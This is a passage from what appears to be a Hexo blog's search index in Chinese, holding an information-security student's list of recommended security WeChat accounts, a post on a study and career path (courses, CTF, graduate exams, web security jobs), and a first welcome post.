</li><li>Ms08067安全实验室</li><li>ChaMd5安全团队</li><li>乌雲安全</li><li>隐雾安全</li><li>黑白之道</li><li>信安旅程</li><li>安全祖师爷</li><li>快识</li><li>字节脉搏实验室</li><li>Theloner安全团队</li><li>Lambda小队</li><li>嗨嗨安全</li><li>哆啦安全</li><li>CKCsec安全研究院</li><li>狐狸说安全</li><li>猪猪谈安全</li><li>漏洞404</li><li>NearSec</li><li>贝雷帽Sec</li><li>LK安全</li><li>SecHub网络安全社区</li><li>白帽子左一</li><li>西子实验室</li><li>哈拉少安全小队</li><li>湘安无事</li><li>橘猫学安全</li><li>LemonSec</li><li>安全狗的自我修养</li><li>编码安全研究</li><li>Shadow Sec Team </li><li>Writeup</li><li>黑子的自我拯救</li><li> 刨洞安全团队</li><li>Web安全工具库</li><li>看雪学苑<br>…<br>也可以关注你喜欢的或者想入职的公司的安全团队或者应急响应中心SRC</li></ol><h2 id="（二）知乎-微博"><a href="#（二）知乎-微博" class="headerlink" title="（二）知乎 微博"></a>（二）知乎 微博</h2><p>其实微博有很多硕博大佬，计算机领域的大佬，以后补充吧<br>当然毕竟微博是社交性较强的软件，得到的信息就不是特别干货那种啦。</p><h2 id="（三）视频学习"><a href="#（三）视频学习" class="headerlink" title="（三）视频学习"></a>（三）视频学习</h2><p>别以为只有B站有<br>有时候其实知识付费未尝不可，毕竟那些资源也不是能够完全公开学习的，自行斟酌吧。</p><h2 id="（四）书籍-网站-论坛社区"><a href="#（四）书籍-网站-论坛社区" class="headerlink" title="（四）书籍/网站/论坛社区"></a>（四）书籍/网站/论坛社区</h2><p>书籍：可以去找思维导图<br>网站类：其实有很多安全社区，知识星球什么的</p>]]></content>
    
    
    
    <tags>
      
      <tag>公众号推荐</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>学习之路</title>
    <link href="/2021/03/10/isway/"/>
    <url>/2021/03/10/isway/</url>
    
    <content type="html"><![CDATA[<h1 id="信息安全专业学习之路"><a href="#信息安全专业学习之路" class="headerlink" title="信息安全专业学习之路"></a>信息安全专业学习之路</h1><p>将在这里慢慢分享我个人的学习经验</p><h2 id="一、专业基础课"><a href="#一、专业基础课" class="headerlink" title="一、专业基础课"></a>一、专业基础课</h2><h3 id="1-1-大一大二要学好的科目"><a href="#1-1-大一大二要学好的科目" class="headerlink" title="1.1 大一大二要学好的科目"></a>1.1 大一大二要学好的科目</h3><ol><li> C语言</li><li> 数据结构</li><li>计算机网络<pre><code class="hljs"> 计网一定要学好（我考研的学校科目就是计网和数据结构）</code></pre></li><li>  数据库 </li><li>计组 操作系统 （可能是大三学的） </li><li> 密码学</li></ol><h3 id="1-2-大二大三阶段"><a href="#1-2-大二大三阶段" class="headerlink" title="1.2 大二大三阶段"></a>1.2 大二大三阶段</h3><p> 如果你开始学面向对象了 建议你学好的科目和注意事项：</p><ol><li>语言类：精通一门不要这学一点那学一点<br>Python Java <strong>信安建议学Python</strong> 当然只是建议 我个人确实喜欢Java，而且最开始学习的面向对象语言也是Java，后来还学了C#（做图像处理，用EmguCV的库）</li><li>网络攻防技术</li><li>编译原理 如果你学AI 强烈建议你学好编译原理<br>信息安全专业科班，很多书籍可以参考武汉大学的计算机学院的书籍和课程</li></ol><h2 id="二、所有阶段都可以参加的事"><a href="#二、所有阶段都可以参加的事" class="headerlink" title="二、所有阶段都可以参加的事"></a>二、所有阶段都可以参加的事</h2><h3 id="2-1-CTF"><a href="#2-1-CTF" class="headerlink" title="2.1  CTF"></a>2.1  CTF</h3><ol><li>学习几个方向 边刷题边学习，譬如你是Web安全方向的可以刷Web的题目</li><li>尽量接触其他大学的CTF比赛（很多大学都有，有的甚至有自建网站，这个看你自己的信息检索能力了），不过可能大三了，打比赛的机会比较少了，看你个人，不过如果打过CTF拿奖或者有经验的话，企业招聘和考研面试都会给好印象。<h3 id="2-2-学业-大创"><a href="#2-2-学业-大创" class="headerlink" title="2.2 学业 大创"></a>2.2 学业 大创</h3>大一：总的来说，大一浑浑噩噩，工作室笔试都被刷了</li></ol><p>大二：学习图像处理 这期间受益良多 知道了学习一个领域的技巧 研究生师兄对我影响颇深</p><p>大三：<br>大创 目前队友完成了大创的基本代码，跑的是一个文本处理的主题模型算法，这里是为了锻炼自己的Python，但是由于刚捡回来，还是很吃力。</p><p>参加完美赛，我是负责写论文的，队友负责建模，我也负责一些代码处理文本，当然也是比较简单的工作，最难的还是怎么规划好论文，找到合适的算法和模型。</p><p>最近：成果如下，大三大创省级，美赛优秀奖哈哈哈（惭愧）<br>大四在等待考研复试</p><p>如果有相关信安考研的问题可以私信问我 或者关注我的个人公众号：打代码的猫</p><h3 id="2-3-大学以来我的三个方向"><a href="#2-3-大学以来我的三个方向" class="headerlink" title="2.3  大学以来我的三个方向"></a>2.3  大学以来我的三个方向</h3><ol><li>文本处理 2. 计算机视觉 3. 安全<br>其实我个人目前接触的领域就是上面几个<br>综合来说我觉得如果是有兴趣的话，可以努力往算法方向发展，然后争取读研。所以NLP和CV是值得学习的。<br>走安全路线的话，那么就和我一样，大三寒暑假开始备考。</li><li>疫情关系，待在家了里，开始了筹备考研的事情。</li><li>已经在复习考研了，最近毕业设计的事情也开始了。</li><li>已经考完研了，忙毕设和准备复试<h3 id="2-4-LeetCode"><a href="#2-4-LeetCode" class="headerlink" title="2.4 LeetCode"></a>2.4 LeetCode</h3>程序员如果就业或者为了提高编程技能，还是要刷题的<br>这部分我不是特别清楚，可以自行搜索。<h3 id="2-5-学习如何为自己未来做规划"><a href="#2-5-学习如何为自己未来做规划" class="headerlink" title="2.5 学习如何为自己未来做规划"></a>2.5 学习如何为自己未来做规划</h3>以上我所说的很多都是自己主动寻找的项目或者比赛，总结就是大学期间一定要多尝试，别怕尝试，怕麻烦。假如试错了，回头换个方向也是好的。<br>目前大创获得省级提名，美赛虽然没有获奖但也是一个过程吧。正在努力考研了。</li></ol><h2 id="三、考研"><a href="#三、考研" class="headerlink" title="三、考研"></a>三、考研</h2><p>初试成绩目前确定是过线了的 复试科目是离散数学<br>正在努力中！！！  </p><h2 id="四、-就业方向-Web安全工程师"><a href="#四、-就业方向-Web安全工程师" class="headerlink" title="四、 就业方向 Web安全工程师"></a>四、 就业方向 Web安全工程师</h2><p>可以根据企业需求来定。<br>安全就业方向其实有几大类：安全研发，安全开发，安全服务等等，还有特定的譬如Web安全，渗透工程师等等。<br>企业有例如奇安信，深信服，永信至诚，绿盟，蓝盾等等。去招聘网看。<br>大三下学期可以开始投简历，电话面试什么的，多面几次！</p><p>根据企业要求来学习其实很重要，即使考研也应该清楚自己想要的是什么。<br>可以自己找几个岗位要求多看几次，根据那些来充实自己！疫情期间正是赶超别人的好时机！大家都要加油呀！</p><h3 id="这是本人的对自己这一年的规划"><a href="#这是本人的对自己这一年的规划" class="headerlink" title="这是本人的对自己这一年的规划"></a>这是本人的对自己这一年的规划</h3><p>接下来会对各个计划细分 并且以博客的形式记录下来  以保持每日学习的状态</p><h3 id="我的gitee主页：kitescat的博客"><a href="#我的gitee主页：kitescat的博客" class="headerlink" title="我的gitee主页：kitescat的博客"></a>我的gitee主页：<a href="https://kitescat.gitee.io/">kitescat的博客</a></h3>]]></content>
    
    
    
    <tags>
      
      <tag>自学指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>这是我的第一条博客</title>
    <link href="/2021/03/10/hello-world/"/>
    <url>/2021/03/10/hello-world/</url>
    
    <content type="html"><![CDATA[<p>基于Hexo发布的个人博客</p><h2 id="我的第一条博客"><a href="#我的第一条博客" class="headerlink" title="我的第一条博客"></a>我的第一条博客</h2><p>基于Hexo发布的个人博客主页，虽然没有什么技术含量，但是后面慢慢更新自己的技术栈吧！</p><h3 id="欢迎关注我的个人公众号：打代码的猫"><a href="#欢迎关注我的个人公众号：打代码的猫" class="headerlink" title="欢迎关注我的个人公众号：打代码的猫"></a>欢迎关注我的个人公众号：打代码的猫</h3><h2 id=""><a href="#" class="headerlink" title=""></a><img src="/img/gzh.jpg"></h2><p>written by: kitescat<br>3/10/2021 1:12:14 AM   </p>]]></content>
    
    
    
    <tags>
      
      <tag>自学指南</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
